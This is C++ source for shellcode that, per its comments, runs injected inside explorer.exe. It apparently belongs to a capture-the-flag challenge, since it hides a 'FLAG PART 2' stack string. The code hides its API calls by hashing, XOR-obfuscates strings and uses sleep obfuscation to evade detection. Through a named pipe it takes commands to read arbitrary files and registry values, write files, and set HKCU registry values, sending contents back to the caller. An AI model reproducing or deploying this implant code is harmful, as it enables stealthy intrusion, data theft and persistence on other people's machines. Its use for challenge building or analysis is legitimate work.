// Shellcode living in explorer.exe - handles file operations
// Waits on named pipe for file check requests, responds with file content

#include "api_hashing.hpp"
#include "config_type.hpp"
#include "memory.hpp"
#include "obfuscated_string.hpp"
#include "pipe_protocol.hpp"
#include "sleep_obfuscation.hpp"
#include "shellcode_config.hpp"
#include "utils.hpp"

// Shellcode entry point - accepts parameter for config
extern "C" __attribute__((section(".text$A"))) DWORD shellcode_main(LPVOID lpParameter) {
    (void)lpParameter;
    DEBUG("=== File Shellcode Starting ===");

    // Flag part 2 hidden in shellcode (stack string)
    volatile char flag_part_2[] = {'F','L','A','G',' ','P','A','R','T','_','2',':',' ','t','_','K','i','N','d','_','0','F','_','P','0','\0'};
    if (flag_part_2[0] == 'X') return 0;  // Never true, but prevents optimization

    // Initialize configuration
    config_t config = {0};
    if (init_shellcode_config(&config) != 0) {
        ERROR_LOG("Failed to initialize config");
        return 1;
    }

    // Resolve required modules
    HMODULE kernel32 = config.kernel32;
    HMODULE ntdll = config.ntdll;

    // Get required functions
    typedef HANDLE (WINAPI* fnCreateNamedPipeA)(const char*, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, LPSECURITY_ATTRIBUTES);
    typedef BOOL (WINAPI* fnConnectNamedPipe)(HANDLE, LPOVERLAPPED);
    typedef BOOL (WINAPI* fnDisconnectNamedPipe)(HANDLE);
    typedef BOOL (WINAPI* fnReadFile)(HANDLE, void*, uint32_t, uint32_t*, LPOVERLAPPED);
    typedef BOOL (WINAPI* fnWriteFile)(HANDLE, const void*, uint32_t, uint32_t*, LPOVERLAPPED);
    typedef HANDLE (WINAPI* fnCreateFileA)(const char*, uint32_t, uint32_t, LPSECURITY_ATTRIBUTES, uint32_t, uint32_t, HANDLE);
    typedef uint32_t (WINAPI* fnGetFileSize)(HANDLE, uint32_t*);
    typedef BOOL (WINAPI* fnCloseHandle)(HANDLE);
    typedef void (WINAPI* fnExitThread)(uint32_t);
    typedef BOOL (WINAPI* fnFlushFileBuffers)(HANDLE);


    fnCreateNamedPipeA fn_create_named_pipe_a = (fnCreateNamedPipeA)get_proc_address(kernel32, CREATENAMEDPIPEA);
    fnConnectNamedPipe fn_connect_named_pipe = (fnConnectNamedPipe)get_proc_address(kernel32, CONNECTNAMEDPIPE);
    fnDisconnectNamedPipe fn_disconnect_named_pipe = (fnDisconnectNamedPipe)get_proc_address(kernel32, DISCONNECTNAMEDPIPE);
    fnReadFile fn_read_file = (fnReadFile)get_proc_address(kernel32, READFILE);
    fnWriteFile fn_write_file = (fnWriteFile)get_proc_address(kernel32, WRITEFILE);
    fnCreateFileA fn_create_file_a = (fnCreateFileA)get_proc_address(kernel32, CREATEFILEA);
    fnGetFileSize fn_get_file_size = (fnGetFileSize)get_proc_address(kernel32, GETFILESIZE);
    fnCloseHandle fn_close_handle = (fnCloseHandle)get_proc_address(kernel32, CLOSEHANDLE);
    fnExitThread fn_exit_thread = (fnExitThread)get_proc_address(kernel32, EXITTHREAD);
    fnFlushFileBuffers fn_flush_file_buffers = (fnFlushFileBuffers)get_proc_address(config.kernel32, FLUSHFILEBUFFERS);

    // Get CreateEventA and ResetEvent functions
    typedef HANDLE (WINAPI* fnCreateEventA)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, const char*);
    typedef BOOL (WINAPI* fnResetEvent)(HANDLE);
    fnCreateEventA fn_create_event_a = (fnCreateEventA)get_proc_address(kernel32, CREATEEVENTA);
    fnResetEvent fn_reset_event = (fnResetEvent)get_proc_address(kernel32, RESETEVENT);

    // Create event for overlapped I/O
    HANDLE connect_event = fn_create_event_a(NULL, TRUE, FALSE, NULL);  // Manual reset event
    if (!connect_event) {
        ERROR_LOG("Failed to create event");
        unload_shellcode_config(&config);
        SAFE_EXIT_THREAD(1);
    }

    // Create named pipe server with overlapped flag
    XOR_STR("\\\\.\\pipe\\file", pipe_name);
    DEBUG("Creating file pipe: %s", pipe_name);

    HANDLE pipe = fn_create_named_pipe_a(
        pipe_name,
        0x00000003 | 0x40000000,  // PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
        0x00000000,  // PIPE_TYPE_BYTE | PIPE_WAIT
        1,           // Max instances
        4096,        // Out buffer size
        4096,        // In buffer size
        0,           // Default timeout
        NULL
    );

    if (pipe == (HANDLE)-1) {  // INVALID_HANDLE_VALUE
        ERROR_LOG("Failed to create file pipe");
        fn_close_handle(connect_event);
        unload_shellcode_config(&config);
        SAFE_EXIT_THREAD(1);
    }

    // Main loop: wait for requests
    while (1) {
        // Start async connection - this makes the event signaled when client connects
        OVERLAPPED overlapped = {0};
        overlapped.hEvent = connect_event;

        fn_connect_named_pipe(pipe, &overlapped);  // Start listening asynchronously

        // Sleep obfuscation - wait on event that signals when client connects
        DEBUG("Entering sleep obfuscation, waiting for connection...");
        sleep_obfuscation(&config, connect_event);

        // When we wake up, connection is established
        DEBUG("Woke from sleep obfuscation, connection established!");

        // Read request header
        pipe_msg_header_t header;
        uint32_t read = 0;
        fn_read_file(pipe, &header, sizeof(header), &read, NULL);

        // Check for QUIT message
        if (read == sizeof(header) && header.type == PIPE_MSG_QUIT) {
            INFO("Received QUIT message, exiting...");
            fn_flush_file_buffers(pipe);
            fn_disconnect_named_pipe(pipe);
            break;  // Exit main loop
        }

        if (read != sizeof(header) || header.type != PIPE_MSG_FILE_REQUEST) {
            ERROR_LOG("Invalid file request");
            fn_flush_file_buffers(pipe);
            fn_disconnect_named_pipe(pipe);
            continue;
        }

        // Read command buffer
        uint8_t command_buf[MAX_FILE_PATH_SIZE] = {0};
        if (header.size > 0 && header.size < MAX_FILE_PATH_SIZE) {
            fn_read_file(pipe, command_buf, header.size, &read, NULL);

            // Parse command code (first byte)
            uint8_t cmd_code = command_buf[0];
            uint8_t* params = command_buf + 1;
            size_t params_len = header.size - 1;

            DEBUG("Processing command code: 0x%02X (%zu param bytes)", cmd_code, params_len);

            // Response buffer
            uint8_t* response_data = NULL;
            uint32_t response_size = 0;

            // Process command based on code
            switch (cmd_code) {
                case CMD_CHECK_FILE: {
                    // Format: [0x00][path\0]
                    char* path = (char*)params;
                    DEBUG("CHECK_FILE: %s", path);

                    // Expand environment variables
                    typedef DWORD (WINAPI* fnExpandEnvironmentStringsA)(const char*, char*, DWORD);
                    fnExpandEnvironmentStringsA fn_expand = (fnExpandEnvironmentStringsA)get_proc_address(kernel32, EXPANDENVIRONMENTSTRINGSA);

                    char expanded_path[MAX_FILE_PATH_SIZE];
                    if (fn_expand) {
                        fn_expand(path, expanded_path, sizeof(expanded_path));
                    } else {
                        // Fallback: copy as-is
                        for (size_t i = 0; i < MAX_FILE_PATH_SIZE && path[i]; i++) {
                            expanded_path[i] = path[i];
                        }
                    }

                    DEBUG("Expanded path: %s", expanded_path);

                    // Try to open and read file
                    HANDLE file = fn_create_file_a(
                        expanded_path,
                        0x80000000,  // GENERIC_READ
                        1,           // FILE_SHARE_READ
                        NULL,
                        3,           // OPEN_EXISTING
                        0,
                        NULL
                    );

                    if (file != (HANDLE)-1) {
                        uint32_t file_size = fn_get_file_size(file, NULL);
                        if (file_size > 0 && file_size <= MAX_FILE_CONTENT_SIZE) {
                            // Calculate path length for echo-back verification
                            size_t path_len = _strlen(path);

                            // Response format: [path\0][file_content]
                            // Echo path proves client decrypted command correctly
                            uint32_t total_size = path_len + 1 + file_size;
                            response_data = (uint8_t*)alloc_mem(&config, total_size);
                            if (response_data) {
                                // Copy path + null terminator
                                for (size_t i = 0; i <= path_len; i++) {
                                    response_data[i] = path[i];
                                }
                                // Read file content after path
                                fn_read_file(file, response_data + path_len + 1, file_size, &read, NULL);
                                response_size = total_size;
                                INFO_SUCCESS("File found: %u bytes (path echoed)", file_size);
                            }
                        } else {
                            INFO("File is empty");
                        }
                        fn_close_handle(file);
                    } else {
                        INFO("File not found");
                    }
                    break;
                }

                case CMD_CHECK_REG: {
                    // Format: [0x01][key_path\0][value_name\0]
                    char* key_path = (char*)params;
                    size_t key_path_len = 0;
                    while (key_path[key_path_len] && key_path_len < params_len) key_path_len++;
                    char* value_name = key_path + key_path_len + 1;

                    DEBUG("CHECK_REG: %s\\%s", key_path, value_name);

                    // Parse root key (HKCU, HKLM, etc.)
                    #define HKEY_CURRENT_USER  ((HKEY)(ULONG_PTR)((LONG)0x80000001))
                    HKEY root_key = HKEY_CURRENT_USER;  // Default to HKCU
                    char* subkey = key_path;

                    // Find first backslash to split root from subkey
                    char* backslash = key_path;
                    while (*backslash && *backslash != '\\') backslash++;
                    if (*backslash == '\\') {
                        subkey = backslash + 1;
                    }

                    // Resolve registry functions
                    typedef LONG (WINAPI* fnRegOpenKeyExA)(HKEY, const char*, DWORD, DWORD, HKEY*);
                    typedef LONG (WINAPI* fnRegQueryValueExA)(HKEY, const char*, DWORD*, DWORD*, BYTE*, DWORD*);
                    typedef LONG (WINAPI* fnRegCloseKey)(HKEY);

                    fnRegOpenKeyExA fn_reg_open = (fnRegOpenKeyExA)get_proc_address(config.advapi32, REGOPENKEYEXA);
                    fnRegQueryValueExA fn_reg_query = (fnRegQueryValueExA)get_proc_address(config.advapi32, REGQUERYVALUEEXA);
                    fnRegCloseKey fn_reg_close = (fnRegCloseKey)get_proc_address(config.advapi32, REGCLOSEKEY);

                    if (fn_reg_open && fn_reg_query && fn_reg_close) {
                        HKEY hkey;
                        LONG result = fn_reg_open(root_key, subkey, 0, 0x20019, &hkey);  // KEY_READ

                        if (result == 0) {  // ERROR_SUCCESS
                            DWORD type, size = 4096;
                            uint8_t buffer[4096];
                            result = fn_reg_query(hkey, value_name, NULL, &type, buffer, &size);

                            if (result == 0 && size > 0) {
                                // Calculate lengths for echo-back verification
                                size_t value_name_len = _strlen(value_name);

                                // Response format: [key_path\0][value_name\0][value_data]
                                // Echo key/value proves client decrypted command correctly
                                uint32_t total_size = key_path_len + 1 + value_name_len + 1 + size;
                                response_data = (uint8_t*)alloc_mem(&config, total_size);
                                if (response_data) {
                                    uint32_t offset = 0;
                                    // Copy key_path + null
                                    for (size_t i = 0; i <= key_path_len; i++) {
                                        response_data[offset++] = key_path[i];
                                    }
                                    // Copy value_name + null
                                    for (size_t i = 0; i <= value_name_len; i++) {
                                        response_data[offset++] = value_name[i];
                                    }
                                    // Copy value data
                                    for (DWORD i = 0; i < size; i++) {
                                        response_data[offset++] = buffer[i];
                                    }
                                    response_size = total_size;
                                    INFO_SUCCESS("Registry value found: %u bytes (key echoed)", size);
                                }
                            } else {
                                INFO("Registry value not found or empty");
                            }

                            fn_reg_close(hkey);
                        } else {
                            INFO("Registry key not found");
                        }
                    } else {
                        ERROR_LOG("Failed to resolve registry functions");
                    }
                    break;
                }

                case CMD_WRITE_FILE: {
                    // Format: [0x02][path\0][data...]
                    char* path = (char*)params;
                    size_t path_len = 0;
                    while (path[path_len] && path_len < params_len) path_len++;
                    uint8_t* data = params + path_len + 1;
                    size_t data_len = params_len - path_len - 1;

                    DEBUG("WRITE_FILE: %s (%zu bytes)", path, data_len);

                    // Expand environment variables
                    typedef DWORD (WINAPI* fnExpandEnvironmentStringsA)(const char*, char*, DWORD);
                    fnExpandEnvironmentStringsA fn_expand = (fnExpandEnvironmentStringsA)get_proc_address(kernel32, EXPANDENVIRONMENTSTRINGSA);

                    char expanded_path[MAX_FILE_PATH_SIZE];
                    if (fn_expand) {
                        fn_expand(path, expanded_path, sizeof(expanded_path));
                    } else {
                        for (size_t i = 0; i < MAX_FILE_PATH_SIZE && path[i]; i++) {
                            expanded_path[i] = path[i];
                        }
                    }

                    // Create/write file
                    HANDLE file = fn_create_file_a(
                        expanded_path,
                        0x40000000,  // GENERIC_WRITE
                        0,
                        NULL,
                        2,           // CREATE_ALWAYS
                        0x80,        // FILE_ATTRIBUTE_NORMAL
                        NULL
                    );

                    if (file != (HANDLE)-1) {
                        uint32_t written = 0;
                        typedef BOOL (WINAPI* fnWriteFile)(HANDLE, const void*, uint32_t, uint32_t*, void*);
                        fnWriteFile fn_write = (fnWriteFile)get_proc_address(kernel32, WRITEFILE);

                        if (fn_write) {
                            fn_write(file, data, data_len, &written, NULL);
                        }
                        fn_close_handle(file);

                        if (written == data_len) {
                            const char* success_msg = "SUCCESS";
                            response_size = 7;
                            response_data = (uint8_t*)alloc_mem(&config, response_size);
                            if (response_data) {
                                for (int i = 0; i < 7; i++) response_data[i] = success_msg[i];
                            }
                            INFO_SUCCESS("File written successfully");
                        } else {
                            const char* error_msg = "ERROR: Partial write";
                            response_size = 20;
                            response_data = (uint8_t*)alloc_mem(&config, response_size);
                            if (response_data) {
                                for (int i = 0; i < 20; i++) response_data[i] = error_msg[i];
                            }
                            ERROR_LOG("Partial write");
                        }
                    } else {
                        const char* error_msg = "ERROR: Cannot create file";
                        response_size = 25;
                        response_data = (uint8_t*)alloc_mem(&config, response_size);
                        if (response_data) {
                            for (int i = 0; i < 25; i++) response_data[i] = error_msg[i];
                        }
                        ERROR_LOG("Cannot create file");
                    }
                    break;
                }

                case CMD_WRITE_REG: {
                    // Format: [0x03][key_path\0][value_name\0][data...]
                    char* key_path = (char*)params;
                    size_t key_path_len = 0;
                    while (key_path[key_path_len] && key_path_len < params_len) key_path_len++;
                    char* value_name = key_path + key_path_len + 1;
                    size_t value_name_len = 0;
                    while (value_name[value_name_len] && (key_path_len + 1 + value_name_len) < params_len) value_name_len++;
                    uint8_t* data = (uint8_t*)(value_name + value_name_len + 1);
                    size_t data_len = params_len - key_path_len - value_name_len - 2;

                    DEBUG("WRITE_REG: %s\\%s (%zu bytes)", key_path, value_name, data_len);

                    // Parse root key
                    #define HKEY_CURRENT_USER  ((HKEY)(ULONG_PTR)((LONG)0x80000001))
                    HKEY root_key = HKEY_CURRENT_USER;
                    char* subkey = key_path;
                    char* backslash = key_path;
                    while (*backslash && *backslash != '\\') backslash++;
                    if (*backslash == '\\') {
                        subkey = backslash + 1;
                    }

                    // Resolve registry functions
                    typedef LONG (WINAPI* fnRegCreateKeyExA)(HKEY, const char*, DWORD, char*, DWORD, DWORD, void*, HKEY*, DWORD*);
                    typedef LONG (WINAPI* fnRegSetValueExA)(HKEY, const char*, DWORD, DWORD, const BYTE*, DWORD);
                    typedef LONG (WINAPI* fnRegCloseKey)(HKEY);

                    fnRegCreateKeyExA fn_reg_create = (fnRegCreateKeyExA)get_proc_address(config.advapi32, REGCREATEKEYEXA);
                    fnRegSetValueExA fn_reg_set = (fnRegSetValueExA)get_proc_address(config.advapi32, REGSETVALUEEXA);
                    fnRegCloseKey fn_reg_close = (fnRegCloseKey)get_proc_address(config.advapi32, REGCLOSEKEY);

                    if (fn_reg_create && fn_reg_set && fn_reg_close) {
                        HKEY hkey;
                        DWORD disposition;
                        LONG result = fn_reg_create(root_key, subkey, 0, NULL, 0, 0x20006, NULL, &hkey, &disposition);  // KEY_WRITE

                        if (result == 0) {
                            result = fn_reg_set(hkey, value_name, 0, 1, data, data_len);  // REG_SZ
                            fn_reg_close(hkey);

                            if (result == 0) {
                                const char* success_msg = "SUCCESS";
                                response_size = 7;
                                response_data = (uint8_t*)alloc_mem(&config, response_size);
                                if (response_data) {
                                    for (int i = 0; i < 7; i++) response_data[i] = success_msg[i];
                                }
                                INFO_SUCCESS("Registry value written");
                            } else {
                                const char* error_msg = "ERROR: Cannot set value";
                                response_size = 23;
                                response_data = (uint8_t*)alloc_mem(&config, response_size);
                                if (response_data) {
                                    for (int i = 0; i < 23; i++) response_data[i] = error_msg[i];
                                }
                                ERROR_LOG("Cannot set registry value");
                            }
                        } else {
                            const char* error_msg = "ERROR: Cannot create key";
                            response_size = 24;
                            response_data = (uint8_t*)alloc_mem(&config, response_size);
                            if (response_data) {
                                for (int i = 0; i < 24; i++) response_data[i] = error_msg[i];
                            }
                            ERROR_LOG("Cannot create registry key");
                        }
                    } else {
                        ERROR_LOG("Failed to resolve registry functions");
                    }
                    break;
                }

                default:
                    ERROR_LOG("Unknown command code: 0x%02X", cmd_code);
                    break;
            }

            // Send response
            pipe_msg_header_t response;
            response.type = PIPE_MSG_FILE_RESPONSE;
            response.size = response_size;

            uint32_t written = 0;
            fn_write_file(pipe, &response, sizeof(response), &written, NULL);
            if (response_size > 0 && response_data) {
                fn_write_file(pipe, response_data, response_size, &written, NULL);
                dealloc_mem(&config, response_data);
            }

            DEBUG("Sent response: %u bytes", response_size);
        }
        fn_flush_file_buffers(pipe);
        // Disconnect and reset event for next connection
        fn_disconnect_named_pipe(pipe);
        fn_reset_event(connect_event);
    }

    fn_close_handle(pipe);
    fn_close_handle(connect_event);
    unload_shellcode_config(&config);
    SAFE_EXIT_THREAD(0);
}

#if VERBOSE >= 1
int main() {
    shellcode_main(NULL);
    return 0;
}
#endif
